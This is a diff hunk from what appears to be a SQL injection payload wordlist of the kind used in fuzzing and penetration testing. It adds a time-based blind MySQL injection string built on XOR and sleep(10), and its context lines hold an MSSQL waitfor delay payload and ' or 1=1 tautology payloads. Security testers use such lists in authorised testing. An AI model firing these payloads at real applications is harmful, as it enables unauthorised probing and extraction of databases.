@@ -7,6 +7,7 @@
 '&'
 '^'
 '*'
+0'XOR(if(now()=sysdate(),sleep(10),0)) XOR'Z
 ';%20waitfor%20delay%20'0:0:6'%20--%20
 ' or 1=1 limit 1 -- -+
 '="or'
